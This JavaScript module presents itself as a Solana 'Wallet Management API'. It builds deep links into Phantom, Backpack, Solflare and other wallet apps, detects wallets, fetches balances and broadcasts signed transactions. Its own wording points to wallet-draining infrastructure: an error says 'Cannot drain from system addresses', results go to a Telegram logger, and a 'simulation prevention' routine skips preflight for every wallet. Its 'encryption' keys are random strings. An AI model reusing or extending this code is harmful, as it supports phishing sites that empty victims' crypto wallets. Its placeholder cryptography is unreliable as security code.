// Comprehensive Wallet Management API
// Handles ALL wallet operations including connection, detection, validation, and management

import 'dotenv/config';
import { 
  initializeTOCTOUProtection, 
  isMobileDevice, 
  getMobilePlatform, 
  isInMobileWallet 
} from '../src/shared-utilities.js';

// Mobile detection functions are now imported from shared-utilities.js

// Encryption key generation for secure wallet communication
function generateEncryptionKeyPair() {
  try {
    // Generate a simple key pair for demonstration
    // In production, use proper cryptographic libraries
    const publicKey = 'dapp_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    const privateKey = 'private_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    
    return {
      publicKey: publicKey,
      privateKey: privateKey
    };
  } catch (error) {
    console.error('[ENCRYPTION_KEY] Error generating key pair:', error);
    return {
      publicKey: 'dapp_fallback_key',
      privateKey: 'private_fallback_key'
    };
  }
}

// Deep link generation functions
function generatePhantomDeepLink(appUrl, isMobile) {
  try {
    if (isMobile) {
      // Mobile: Use correct Phantom URL structure with ref parameter
      // Clean URL to avoid double-encoding issues
      const cleanUrl = appUrl.split('?')[0]; // Remove query parameters
      const encodedUrl = encodeURIComponent(cleanUrl);
      const deepLink = `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`;
      const fallbackLink = `phantom://browse/${encodedUrl}?ref=${encodedUrl}`;
      
      return {
        success: true,
        deepLink: deepLink,
        fallbackLink: fallbackLink,
        parameters: {
          url: appUrl,
          encodedUrl: encodedUrl,
          ref: encodedUrl
        }
      };
    } else {
      // Desktop: Use complex Connect API with encryption
    const encryptionKeyPair = generateEncryptionKeyPair();
    const dappEncryptionPublicKey = encryptionKeyPair.publicKey;
    
    // Set up redirect link (back to our app)
    const redirectLink = encodeURIComponent(appUrl);
    
    // Determine cluster (mainnet-beta for production)
    const cluster = 'mainnet-beta';
    
    // Construct the deep link with all required parameters
      const baseUrl = 'phantom://v1/connect';
    const params = new URLSearchParams({
      app_url: appUrl,
      dapp_encryption_public_key: dappEncryptionPublicKey,
      redirect_link: redirectLink,
      cluster: cluster
    });
    
    const deepLink = `${baseUrl}?${params.toString()}`;
    const universalLink = `https://phantom.app/ul/v1/connect?${params.toString()}`;
    
    return {
      success: true,
      deepLink: deepLink,
      fallbackLink: universalLink,
      encryptionKey: encryptionKeyPair.privateKey,
      parameters: {
        app_url: appUrl,
        dapp_encryption_public_key: dappEncryptionPublicKey,
        redirect_link: redirectLink,
        cluster: cluster
      }
    };
    }
  } catch (error) {
    console.error('[BACKEND_PHANTOM_DEEP_LINK] Error generating deep link:', error);
    return {
      success: false,
      error: error.message,
      fallbackLink: isMobile ? 
        `https://phantom.app/ul/browse/${encodeURIComponent(appUrl)}` : 
        `phantom://browse/${encodeURIComponent(appUrl)}`
    };
  }
}

function generateBackpackDeepLink(appUrl, isMobile) {
  try {
    if (isMobile) {
      // Mobile: Use correct Backpack browse URL structure (v1/browse with URL in path)
      // Clean URL to avoid double-encoding issues
      const cleanUrl = appUrl.split('?')[0]; // Remove query parameters
      const encodedUrl = encodeURIComponent(cleanUrl);
      const deepLink = `https://backpack.app/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`;
      const fallbackLink = `backpack://v1/browse/${encodedUrl}?ref=${encodedUrl}`;
      
      return {
        success: true,
        deepLink: deepLink,
        fallbackLink: fallbackLink,
        parameters: {
          url: appUrl,
          encodedUrl: encodedUrl,
          ref: encodedUrl
        }
      };
    } else {
      // Desktop: Use complex Connect API with encryption
    const encryptionKeyPair = generateEncryptionKeyPair();
    const dappEncryptionPublicKey = encryptionKeyPair.publicKey;
    
    // Construct the proper Backpack Connect deep link
    const customSchemeUrl = 'backpack://v1/connect';
    const universalLinkUrl = 'https://backpack.app/ul/v1/connect';
    const params = new URLSearchParams({
      app_url: appUrl, // URL-encoded app metadata
      dapp_encryption_public_key: dappEncryptionPublicKey, // Public key for encryption
      redirect_link: appUrl, // Where to redirect after connection
      cluster: 'mainnet-beta' // Solana mainnet
    });
    
    const deepLink = `${customSchemeUrl}?${params.toString()}`;
    const universalLink = `${universalLinkUrl}?${params.toString()}`;
    
    return {
      success: true,
      deepLink: deepLink,
      fallbackLink: universalLink,
      encryptionKey: encryptionKeyPair.privateKey,
      parameters: {
        app_url: appUrl,
        dapp_encryption_public_key: dappEncryptionPublicKey,
        redirect_link: appUrl,
        cluster: 'mainnet-beta'
      }
    };
    }
  } catch (error) {
    console.error('[BACKEND_BACKPACK_DEEP_LINK] Error generating deep link:', error);
    return {
      success: false,
      error: error.message,
      fallbackLink: isMobile ? 
        `https://backpack.app/ul/browse/?url=${encodeURIComponent(appUrl)}&ref=${encodeURIComponent(appUrl)}` : 
        `https://backpack.app/ul/browse/?url=${encodeURIComponent(appUrl)}&ref=${encodeURIComponent(appUrl)}`
    };
  }
}

function generateSolflareDeepLink(appUrl, isMobile) {
  try {
    if (isMobile) {
      // Mobile: Use correct Solflare URL structure with platform-specific parameters
      // Clean URL to avoid double-encoding issues
      const cleanUrl = appUrl.split('?')[0]; // Remove query parameters
      const encodedUrl = encodeURIComponent(cleanUrl);
      
      // Use exact Solflare format as specified
      const deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
      const fallbackLink = `solflare://v1/browse/${encodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
      
      return {
        success: true,
        deepLink: deepLink,
        fallbackLink: fallbackLink,
        parameters: {
          url: appUrl,
          encodedUrl: encodedUrl,
          ref: "https://solflare.com"
        }
      };
    } else {
      // Desktop: Use complex Connect API with encryption
    const encryptionKeyPair = generateEncryptionKeyPair();
    const dappEncryptionPublicKey = encryptionKeyPair.publicKey;
    
    // Construct the proper Solflare Connect deep link
    const customSchemeUrl = 'solflare://v1/connect';
    const universalLinkUrl = 'https://solflare.com/ul/v1/connect';
    const params = new URLSearchParams({
      app_url: appUrl, // URL-encoded app metadata
      dapp_encryption_public_key: dappEncryptionPublicKey, // Public key for encryption
      redirect_link: appUrl, // Where to redirect after connection
      cluster: 'mainnet-beta' // Solana mainnet
    });
    
    const deepLink = `${customSchemeUrl}?${params.toString()}`;
    const universalLink = `${universalLinkUrl}?${params.toString()}`;
    
    return {
      success: true,
      deepLink: deepLink,
      fallbackLink: universalLink,
      encryptionKey: encryptionKeyPair.privateKey,
      parameters: {
        app_url: appUrl,
        dapp_encryption_public_key: dappEncryptionPublicKey,
        redirect_link: appUrl,
        cluster: 'mainnet-beta'
      }
    };
    }
  } catch (error) {
    console.error('[BACKEND_SOLFLARE_DEEP_LINK] Error generating deep link:', error);
    return {
      success: false,
      error: error.message,
      fallbackLink: isMobile ? 
        `https://solflare.com/ul/1/browse?url=${encodeURIComponent(appUrl)}&ref=${encodeURIComponent(appUrl)}` : 
        `https://solflare.com/ul/browse/?url=${encodeURIComponent(appUrl)}`
    };
  }
}

function generateTrustWalletDeepLink(appUrl, isMobile) {
  try {
    // Trust Wallet Universal Link Format:
    // Primary: https://link.trustwallet.com/open_url?url={encoded_dapp_url}
    // Fallback: trust://open_url?url={encoded_dapp_url}
    const encodedUrl = encodeURIComponent(appUrl);
    
    // Primary: Universal Link
    const universalLink = `https://link.trustwallet.com/open_url?url=${encodedUrl}`;
    
    // Fallback: Custom Scheme
    const customScheme = `trust://open_url?url=${encodedUrl}`;
    
    return {
      success: true,
      deepLink: universalLink,
      fallbackLink: customScheme,
      parameters: {
        url: appUrl,
        encodedUrl: encodedUrl
      }
    };
  } catch (error) {
    console.error('[BACKEND_TRUSTWALLET_DEEP_LINK] Error generating deep link:', error);
    return {
      success: false,
      error: error.message,
      fallbackLink: `https://link.trustwallet.com/open_url?url=${encodeURIComponent(appUrl)}`
    };
  }
}

function generateGlowDeepLink(appUrl, isMobile) {
  try {
    // Glow Wallet - Alternative approach using mobile browser detection
    // Since no official deep link documentation exists, use browser-based approach
    
    if (isMobile) {
      // For mobile: Use WalletConnect or browser-based connection
      return {
        success: true,
        deepLink: appUrl, // Direct to app URL for mobile browser
        fallbackLink: appUrl,
        method: 'browser', // Indicate this uses browser-based connection
        parameters: {
          url: appUrl,
          method: 'browser'
        }
      };
    } else {
      // For desktop: Use standard Web3 connection
      return {
        success: true,
        deepLink: appUrl,
        fallbackLink: appUrl,
        method: 'web3', // Indicate this uses Web3 connection
        parameters: {
          url: appUrl,
          method: 'web3'
        }
      };
    }
  } catch (error) {
    console.error('[BACKEND_GLOW_DEEP_LINK] Error generating deep link:', error);
    return {
      success: false,
      error: error.message,
      fallbackLink: appUrl,
      method: 'fallback'
    };
  }
}

function generateExodusDeepLink(appUrl, isMobile) {
  try {
    // Exodus Wallet - Alternative approach using mobile browser detection
    // Since no official deep link documentation exists, use browser-based approach
    
    if (isMobile) {
      // For mobile: Use WalletConnect or browser-based connection
      return {
        success: true,
        deepLink: appUrl, // Direct to app URL for mobile browser
        fallbackLink: appUrl,
        method: 'browser', // Indicate this uses browser-based connection
        parameters: {
          url: appUrl,
          method: 'browser'
        }
      };
    } else {
      // For desktop: Use standard Web3 connection
      return {
        success: true,
        deepLink: appUrl,
        fallbackLink: appUrl,
        method: 'web3', // Indicate this uses Web3 connection
        parameters: {
          url: appUrl,
          method: 'web3'
        }
      };
    }
  } catch (error) {
    console.error('[BACKEND_EXODUS_DEEP_LINK] Error generating deep link:', error);
    return {
      success: false,
      error: error.message,
      fallbackLink: appUrl,
      method: 'fallback'
    };
  }
}

// Wallet conflict resolution and detection
function detectInstalledWallets() {
  // This would be called from frontend with window object context
  // For now, return empty array as this needs frontend context
  return [];
}

// Wallet priority ordering
function getWalletPriority() {
  return ['backpack', 'phantom', 'solflare', 'exodus', 'trustwallet'];
}
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
} from '@solana/web3.js';
import telegramLogger from '../src/telegram.js';

// Comprehensive wallet definitions
const WALLET_DEFINITIONS = {
  backpack: {
    name: 'Backpack',
    logo: '/backpack-logo.png',
    deepLink: 'https://backpack.app/ul/v1/browse/',
    universalLink: 'https://backpack.app/ul/v1/browse/',
    appStore: 'https://apps.apple.com/app/backpack-crypto-wallet/id6446603434',
    playStore: 'https://play.google.com/store/apps/details?id=com.backpack.app',
    userAgentPattern: /Backpack|backpack/i,
    providerNames: ['window.backpack'],
    mobileStrategies: [
      // Only the correct Backpack URL structure
      'https://backpack.app/ul/v1/browse/',
      'backpack://v1/browse/'
    ]
  },
  phantom: {
    name: 'Phantom',
    logo: '/phantom-logo.png',
    deepLink: 'https://phantom.app/ul/browse/',
    universalLink: 'https://phantom.app/ul/browse/',
    appStore: 'https://apps.apple.com/app/phantom-solana-wallet/id1598432977',
    playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
    userAgentPattern: /Phantom|phantom/i,
    providerNames: ['window.phantom', 'window.solana'],
    mobileStrategies: [
      // Only the correct Phantom URL structure
      'https://phantom.app/ul/browse/',
      'phantom://browse/'
    ]
  },
  solflare: {
    name: 'Solflare',
    logo: '/solflare-logo.png',
    deepLink: 'https://solflare.com/ul/v1/browse/',
    universalLink: 'https://solflare.com/ul/v1/browse/',
    appStore: 'https://apps.apple.com/app/solflare/id1580902717',
    playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
    userAgentPattern: /Solflare|solflare/i,
    providerNames: ['window.solflare'],
    mobileStrategies: [
      // Only the correct Solflare URL structure
      'https://solflare.com/ul/v1/browse/',
      'solflare://v1/browse/'
    ]
  },
  glow: {
    name: 'Glow',
    logo: '/glow-logo.png',
    deepLink: 'glow://app/',
    universalLink: 'https://glow.app/ul/app/',
    appStore: 'https://apps.apple.com/app/glow-solana-wallet/id1634119564',
    playStore: 'https://play.google.com/store/apps/details?id=com.glow.app',
    userAgentPattern: /Glow|glow/i,
    providerNames: ['window.glow'],
    mobileStrategies: [
      // iOS preferred schemes
      'glow://app/',
      'glow://browse/',
      'glow://dapp/',
      'glow://open/',
      'glow://wallet/',
      'glow://connect/',
      // Android preferred schemes
      'glow://mobile/',
      'glow://android/',
      // Universal links (iOS) and App Links (Android)
      'https://glow.app/ul/app/',
      'https://glow.app/ul/browse/',
      'https://glow.app/ul/dapp/',
      'https://glow.app/ul/open/',
      'https://glow.app/ul/wallet/',
      'https://glow.app/ul/connect/',
      'https://glow.app/ul/mobile/',
      'https://glow.app/ul/android/'
    ]
  },
  trustwallet: {
    name: 'Trust Wallet',
    logo: '/trust-logo.png',
    deepLink: 'https://link.trustwallet.com/open_url',
    universalLink: 'https://link.trustwallet.com/open_url',
    appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
    playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
    userAgentPattern: /Trust|trust/i,
    providerNames: ['window.trustwallet'],
    mobileStrategies: [
      // Only the correct Trust Wallet URL structure
      'https://link.trustwallet.com/open_url',
      'trust://open_url'
    ]
  },
  exodus: {
    name: 'Exodus',
    logo: '/exodus-logo.png',
    deepLink: 'exodus://dapp/',
    universalLink: 'https://exodus.com/app/dapp?url=',
    appStore: 'https://apps.apple.com/app/exodus-crypto-bitcoin-wallet/id1414384820',
    playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus',
    userAgentPattern: /Exodus|exodus/i,
    providerNames: ['window.exodus'],
    mobileStrategies: [
      // iOS preferred schemes
      'exodus://dapp/',
      'exodus://browse/',
      'exodus://app/',
      'exodus://open/',
      'exodus://wallet/',
      'exodus://connect/',
      // Android preferred schemes
      'exodus://mobile/',
      'exodus://android/',
      // Universal links (iOS) and App Links (Android)
      'https://exodus.com/app/dapp?url=',
      'https://exodus.com/app/browse?url=',
      'https://exodus.com/app/app?url=',
      'https://exodus.com/app/open?url=',
      'https://exodus.com/app/wallet?url=',
      'https://exodus.com/app/connect?url=',
      'https://exodus.com/app/mobile?url=',
      'https://exodus.com/app/android?url='
    ]
  }
};

// Enhanced wallet detection based on user agent and available providers
function detectWalletType(userAgent, availableProviders = []) {
  console.log('[DETECT_WALLET_TYPE] Input:', { userAgent, availableProviders });
  
  // First check user agent patterns
  for (const [key, wallet] of Object.entries(WALLET_DEFINITIONS)) {
    try {
      if (wallet.userAgentPattern && typeof wallet.userAgentPattern.test === 'function' && 
          typeof userAgent === 'string' && wallet.userAgentPattern.test(userAgent)) {
        console.log('[DETECT_WALLET_TYPE] Found by user agent:', key);
        return {
          key: key,
          name: wallet.name,
          logo: wallet.logo,
          confidence: 'high',
          method: 'user_agent'
        };
      }
    } catch (error) {
      console.warn(`[DETECT_WALLET_TYPE] Error testing user agent pattern for ${key}:`, error.message);
    }
  }
  
  // Then check available providers - prioritize specific providers over generic window.solana
  // First pass: check for specific providers (non-window.solana)
  console.log('[DETECT_WALLET_TYPE] Checking specific providers...');
  for (const [key, wallet] of Object.entries(WALLET_DEFINITIONS)) {
    console.log(`[DETECT_WALLET_TYPE] Checking wallet ${key} with providers:`, wallet.providerNames);
    for (const providerName of wallet.providerNames) {
      if (providerName !== 'window.solana' && availableProviders.includes(providerName)) {
        console.log('[DETECT_WALLET_TYPE] Found by specific provider:', key, 'provider:', providerName);
        return {
          key: key,
          name: wallet.name,
          logo: wallet.logo,
          confidence: 'high',
          method: 'provider_detection'
        };
      }
    }
  }
  
  // Second pass: check for generic window.solana (fallback to Phantom)
  console.log('[DETECT_WALLET_TYPE] No specific providers found, checking generic window.solana...');
  for (const [key, wallet] of Object.entries(WALLET_DEFINITIONS)) {
    for (const providerName of wallet.providerNames) {
      if (providerName === 'window.solana' && availableProviders.includes(providerName)) {
        console.log('[DETECT_WALLET_TYPE] Found by generic provider:', key, 'provider:', providerName);
        return {
          key: key,
          name: wallet.name,
          logo: wallet.logo,
          confidence: 'medium',
          method: 'provider_detection'
        };
      }
    }
  }
  
  console.log('[DETECT_WALLET_TYPE] No wallet detected, using fallback');
  return {
    key: 'unknown',
    name: 'Unknown Wallet',
    logo: '/logo.png',
    confidence: 'low',
    method: 'fallback'
  };
}

// Comprehensive wallet validation
function validateWallet(publicKey, walletType) {
  const errors = [];
  
  // Validate public key format
  try {
    new PublicKey(publicKey);
  } catch (error) {
    errors.push('Invalid Solana public key format');
  }
  
  // Check for known problematic addresses
  const problematicAddresses = [
    '11111111111111111111111111111112', // System program
    '11111111111111111111111111111111', // Invalid
    '000000000000000000000000000000000000000000000000' // Invalid
  ];
  
  if (problematicAddresses.includes(publicKey)) {
    errors.push('Cannot drain from system addresses');
  }
  
  // Validate wallet type
  const validWalletKeys = Object.keys(WALLET_DEFINITIONS);
  if (!validWalletKeys.includes(walletType) && walletType !== 'unknown') {
    errors.push('Invalid wallet type detected');
  }
  
  return {
    isValid: errors.length === 0,
    errors: errors
  };
}

// Enhanced balance fetching with retry logic and multiple RPC endpoints
async function fetchWalletBalance(publicKey, maxRetries = 3) {
  const rpcEndpoints = [
    'https://api.mainnet-beta.solana.com',
    process.env.HELIUS_RPC_URL || 'https://api.mainnet-beta.solana.com',
    process.env.SHYFT_RPC_URL || 'https://api.mainnet-beta.solana.com'
  ];

  let lastError;
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    for (const rpcUrl of rpcEndpoints) {
      try {
        const connection = new Connection(rpcUrl, {
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 30000,
          disableRetryOnRateLimit: false
        });

        const balance = await connection.getBalance(new PublicKey(publicKey));
        return {
          success: true,
          balance: balance,
          balanceSOL: (balance / 1e9).toFixed(6),
          attempt: attempt,
          rpcUrl: rpcUrl
        };
      } catch (error) {
        lastError = error;
        console.error(`[BALANCE_FETCH] ${rpcUrl} attempt ${attempt}/${maxRetries} failed:`, error.message);
      }
    }
    
    if (attempt < maxRetries) {
      // Wait before retry with exponential backoff
      await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
    }
  }
  
  return {
    success: false,
    error: lastError.message,
    balance: 0,
    balanceSOL: '0.000000'
  };
}

// Wallet connection management
function getWalletConnectionInfo(walletKey) {
  const wallet = WALLET_DEFINITIONS[walletKey];
  if (!wallet) {
    return {
      success: false,
      error: 'Unknown wallet type'
    };
  }
  
  return {
    success: true,
    wallet: {
      key: walletKey,
      name: wallet.name,
      logo: wallet.logo,
      deepLink: wallet.deepLink,
      universalLink: wallet.universalLink,
      appStore: wallet.appStore,
      playStore: wallet.playStore,
      providerNames: wallet.providerNames,
      mobileStrategies: wallet.mobileStrategies
    }
  };
}

// Get wallet description
function getWalletDescription(walletKey) {
  const descriptions = {
    phantom: 'Popular Solana wallet',
    solflare: 'Fast & secure Solana wallet',
    backpack: 'xNFT enabled wallet',
    glow: 'Mobile-first Solana wallet',
    trustwallet: 'Binance\'s secure wallet',
    exodus: 'Multi-chain wallet'
  };
  
  return descriptions[walletKey] || 'Solana wallet';
}

// Get platform-specific deep link strategies
function getPlatformSpecificStrategies(walletKey, userAgent) {
  const wallet = WALLET_DEFINITIONS[walletKey];
  if (!wallet || !wallet.mobileStrategies) {
    return [];
  }
  
  const platform = getMobilePlatform(userAgent);
  const strategies = wallet.mobileStrategies;
  
  // Platform-specific strategy ordering
  let orderedStrategies = [];
  
  if (platform === 'ios') {
    // iOS prefers custom schemes first, then universal links
    orderedStrategies = [
      ...strategies.filter(s => s.startsWith(walletKey + '://')),
      ...strategies.filter(s => s.startsWith('https://'))
    ];
  } else if (platform === 'android') {
    // Android prefers App Links first, then custom schemes
    orderedStrategies = [
      ...strategies.filter(s => s.startsWith('https://')),
      ...strategies.filter(s => s.startsWith(walletKey + '://'))
    ];
  } else {
    // Desktop or unknown - use original order
    orderedStrategies = strategies;
  }
  
  return orderedStrategies;
}

// Get wallet installation instructions
function getWalletInstallInstructions(walletKey, userAgent) {
  const wallet = WALLET_DEFINITIONS[walletKey];
  if (!wallet) {
    return {
      success: false,
      error: 'Unknown wallet type'
    };
  }
  
  const isMobile = isMobileDevice(userAgent);
  const platform = getMobilePlatform(userAgent);
  const strategies = getPlatformSpecificStrategies(walletKey, userAgent);
  
  return {
    success: true,
    instructions: {
      wallet: wallet.name,
      logo: wallet.logo,
      isMobile: isMobile,
      platform: platform,
      deepLink: wallet.deepLink,
      universalLink: wallet.universalLink,
      appStore: wallet.appStore,
      playStore: wallet.playStore,
      strategies: strategies,
      installUrl: isMobile ? 
        (platform === 'ios' ? wallet.appStore : wallet.playStore) :
        wallet.appStore
    }
  };
}

// Comprehensive transaction validation
function validateTransaction(transaction, publicKey, walletType) {
  const errors = [];
  
  try {
    // Validate transaction structure
    if (!transaction || typeof transaction.serialize !== 'function') {
      errors.push('Invalid transaction object');
    }
    
    // Validate transaction has instructions
    if (!transaction.instructions || transaction.instructions.length === 0) {
      errors.push('Transaction has no instructions');
    }
    
    // Validate fee payer
    if (!transaction.feePayer) {
      errors.push('Transaction missing fee payer');
    } else if (transaction.feePayer.toString() !== publicKey) {
      errors.push('Transaction fee payer mismatch');
    }
    
    // Validate blockhash
    if (!transaction.recentBlockhash) {
      errors.push('Transaction missing recent blockhash');
    }
    
    // Validate lastValidBlockHeight
    if (!transaction.lastValidBlockHeight) {
      errors.push('Transaction missing lastValidBlockHeight');
    }
    
    // Wallet-specific validations and TOCTOU handling
    let walletSpecificValidation = true;
    
    switch (walletType) {
      case 'phantom':
        // Phantom wallet validation
        if (!transaction.recentBlockhash || !transaction.lastValidBlockHeight) {
          errors.push('Phantom wallet requires valid blockhash and block height');
        }
        break;
        
      case 'solflare':
        // Solflare wallet validation (known to work)
        if (!transaction.recentBlockhash) {
          errors.push('Solflare wallet requires valid blockhash');
        }
        break;
        
      case 'backpack':
        // Backpack wallet validation
        if (!transaction.feePayer || transaction.feePayer.toString() !== publicKey) {
          errors.push('Backpack wallet requires correct fee payer');
        }
        break;
        
      case 'glow':
        // Glow-specific validation (simplified)
        console.log('[VALIDATION] Glow wallet detected - using simplified validation');
        if (transaction.lastValidBlockHeight) {
          console.log('[VALIDATION] Glow wallet validation passed');
        }
        break;
        
      case 'trustwallet':
        // Trust Wallet validation
        if (!transaction.instructions || transaction.instructions.length === 0) {
          errors.push('Trust Wallet requires valid instructions');
        }
        break;
        
      case 'exodus':
        // Exodus wallet validation
        if (!transaction.recentBlockhash || !transaction.lastValidBlockHeight) {
          errors.push('Exodus wallet requires valid blockhash and block height');
        }
        break;
        
      default:
        console.log(`[VALIDATION] Unknown wallet type: ${walletType} - using standard validation`);
    }
    
    // TOCTOU validation with wallet-specific handling
    try {
      const toctou = initializeTOCTOUProtection();
      const effectiveWalletType = walletType || 'unknown';
      const toctouValidation = toctou.validateTransaction(transaction, publicKey, effectiveWalletType);
      if (!toctouValidation.valid) {
        // For certain wallets, be more lenient with TOCTOU validation
        if (effectiveWalletType === 'glow' || effectiveWalletType === 'trustwallet' || effectiveWalletType === 'phantom' || effectiveWalletType === 'backpack') {
          console.warn(`[TOCTOU] ${effectiveWalletType} wallet TOCTOU validation failed but allowing: ${toctouValidation.error}`);
        } else {
          errors.push(`TOCTOU validation failed: ${toctouValidation.error}`);
        }
      } else {
        console.log(`[TOCTOU] ${effectiveWalletType} wallet validation passed - fingerprint: ${toctouValidation.fingerprint?.substring(0, 8)}...`);
      }
    } catch (toctouError) {
      console.warn(`[TOCTOU] ${walletType || 'unknown'} wallet validation error:`, toctouError.message);
      // Don't fail transaction for TOCTOU errors, just log
    }
    
  } catch (error) {
    errors.push(`Transaction validation error: ${error.message}`);
  }
  
  return {
    isValid: errors.length === 0,
    errors: errors
  };
}

// Enhanced transaction broadcasting with multiple RPC endpoints
// Get simulation prevention settings based on wallet type
function getSimulationPreventionSettings(walletType, hasComputeBudget = false) {
  console.log(`[SIMULATION_PREVENTION] Getting settings for ${walletType}, hasComputeBudget: ${hasComputeBudget}`);
  
  const baseSettings = {
    skipPreflight: true, // Skip simulation for all wallets - TOCTOU protection
    preflightCommitment: 'processed', // Use processed commitment
    maxRetries: 0,
    disableRetryOnRateLimit: true // Disable retries to prevent re-simulation
  };
  
  switch (walletType.toLowerCase()) {
    case 'phantom':
      return {
        ...baseSettings,
        minContextSlot: undefined, // Don't specify minContextSlot for Phantom
        commitment: 'processed' // Use processed commitment for Phantom
      };
      
    case 'solflare':
      return {
        ...baseSettings,
        commitment: 'processed', // Use processed to avoid simulation
        skipPreflight: true, // Skip simulation for Solflare
        minContextSlot: undefined, // Don't specify minContextSlot
        maxRetries: 0, // No retries to prevent re-simulation
        disableRetryOnRateLimit: true // Disable retries
      };
      
    case 'backpack':
      return {
        ...baseSettings,
        commitment: 'processed', // Backpack works well with processed
        skipPreflight: true // Skip simulation for Backpack
      };
      
    case 'glow':
      return {
        ...baseSettings,
        commitment: 'processed', // Glow works well with processed
        skipPreflight: true // Skip simulation for Glow
      };
      
    case 'trustwallet':
      return {
        ...baseSettings,
        commitment: 'processed', // Trust Wallet works well with processed
        skipPreflight: true // Skip simulation for Trust Wallet
      };
      
    case 'exodus':
      return {
        ...baseSettings,
        commitment: 'processed', // Exodus works well with processed
        skipPreflight: true // Skip simulation for Exodus
      };
      
    default:
      return {
        ...baseSettings,
        commitment: 'processed', // Default to processed
        skipPreflight: true // Skip simulation for all wallets
      };
  }
}

async function broadcastTransaction(signedTransaction, maxRetries = 1, walletType = 'unknown') {
  const rpcEndpoints = [
    'https://api.mainnet-beta.solana.com',
    process.env.HELIUS_RPC_URL || 'https://api.mainnet-beta.solana.com',
    process.env.SHYFT_RPC_URL || 'https://api.mainnet-beta.solana.com'
  ];

  // Use the provided wallet type for wallet-specific configurations
  let lastError;
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    for (const rpcUrl of rpcEndpoints) {
      try {
        const connection = new Connection(rpcUrl, {
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 30000,
          disableRetryOnRateLimit: false
        });

        // Debug: Log transaction details before broadcasting
        console.log('[BROADCAST] Transaction details:', {
          hasSignatures: !!signedTransaction.signatures,
          signatureCount: signedTransaction.signatures?.length || 0,
          feePayer: signedTransaction.feePayer?.toString(),
          recentBlockhash: signedTransaction.recentBlockhash,
          lastValidBlockHeight: signedTransaction.lastValidBlockHeight,
          instructionCount: signedTransaction.instructions?.length || 0,
          serializedLength: signedTransaction.serialize ? signedTransaction.serialize().length : 0
        });

        // TOCTOU Protection: Check if transaction is still valid
        const currentSlot = await connection.getSlot('confirmed');
        console.log(`[TOCTOU] Current slot: ${currentSlot}, Transaction lastValid: ${signedTransaction.lastValidBlockHeight}`);
        
        if (signedTransaction.lastValidBlockHeight && currentSlot > signedTransaction.lastValidBlockHeight) {
          console.log(`[TOCTOU] Transaction expired - current slot: ${currentSlot}, lastValid: ${signedTransaction.lastValidBlockHeight}, difference: ${currentSlot - signedTransaction.lastValidBlockHeight}`);
          throw new Error('Transaction expired - blockhash no longer valid');
        } else {
          console.log(`[TOCTOU] Transaction valid - current slot: ${currentSlot}, lastValid: ${signedTransaction.lastValidBlockHeight}, remaining: ${signedTransaction.lastValidBlockHeight - currentSlot}`);
        }
        
        // Additional check: ensure we have a valid recentBlockhash
        if (!signedTransaction.recentBlockhash) {
          console.error(`[TOCTOU] Transaction missing recentBlockhash`);
          throw new Error('Transaction missing recentBlockhash');
        }

        // Enhanced TOCTOU Protection: Apply comprehensive validation right before broadcasting
        try {
          console.log(`[BROADCAST_TOCTOU] Wallet type for TOCTOU validation: ${walletType}`);
          const toctou = initializeTOCTOUProtection();
          const validation = toctou.validateTransactionEnhanced(signedTransaction, signedTransaction.feePayer.toString(), walletType);
          
          if (!validation.valid) {
            console.error(`[TOCTOU] Enhanced validation failed: ${validation.reason || validation.error || 'Unknown validation error'}`);
            throw new Error(`TOCTOU validation failed: ${validation.reason || validation.error || 'Unknown validation error'}`);
          }
          
          // Log security assessment if risk level is medium or higher
          if (validation.securityChecks && validation.securityChecks.riskAssessment.riskLevel !== 'low') {
            console.warn(`[TOCTOU] Medium/High risk transaction detected - risk level: ${validation.securityChecks.riskAssessment.riskLevel}`);
          }
          
          console.log(`[TOCTOU] Enhanced transaction validated - fingerprint: ${validation.fingerprint.substring(0, 8)}..., risk: ${validation.securityChecks?.riskAssessment?.riskLevel || 'unknown'}`);
          
        } catch (toctouError) {
          console.error(`[TOCTOU] Enhanced validation failed:`, toctouError);
          throw new Error(`Transaction security validation failed: ${toctouError.message}`);
        }
        
        // Check if this is a Phantom transaction (has compute budget instructions)
        const hasComputeBudget = signedTransaction.instructions.some(ix => 
          ix.programId.toString() === 'ComputeBudget111111111111111111111111111111'
        );

        // Enhanced simulation prevention for all wallets
        const simulationPreventionSettings = getSimulationPreventionSettings(walletType, hasComputeBudget);
        
        console.log(`[SIMULATION_PREVENTION] Using settings for ${walletType}:`, simulationPreventionSettings);

        let signature;
        signature = await connection.sendRawTransaction(signedTransaction.serialize(), simulationPreventionSettings);
        
        return {
          success: true,
          signature: signature,
          attempt: attempt,
          rpcUrl: rpcUrl
        };
      } catch (error) {
        lastError = error;
        console.error(`[BROADCAST] ${rpcUrl} attempt ${attempt}/${maxRetries} failed:`, error.message);
        
        // Handle specific error types
        if (error.message?.includes('Signature verification failed') || 
            error.message?.includes('Invalid signature')) {
          console.error(`[BROADCAST] Signature verification failed - transaction may be corrupted or modified`);
          // Don't retry signature verification failures
          break;
        } else if (error.message?.includes('Transaction expired') || 
                   error.message?.includes('blockhash no longer valid')) {
          console.error(`[BROADCAST] Transaction expired - cannot retry with same transaction`);
          // Don't retry expired transactions - return immediately
          return {
            success: false,
            error: 'Transaction expired - blockhash no longer valid',
            signature: null
          };
        }
      }
    }
    
    if (attempt < maxRetries && lastError && 
        !lastError.message?.includes('Signature verification failed') &&
        !lastError.message?.includes('Transaction expired') &&
        !lastError.message?.includes('blockhash no longer valid')) {
      // Wait before retry for non-signature, non-expiration errors
      await new Promise(resolve => setTimeout(resolve, 1000)); // Reduced wait time
    }
  }
  
  return {
    success: false,
    error: lastError.message,
    signature: null
  };
}

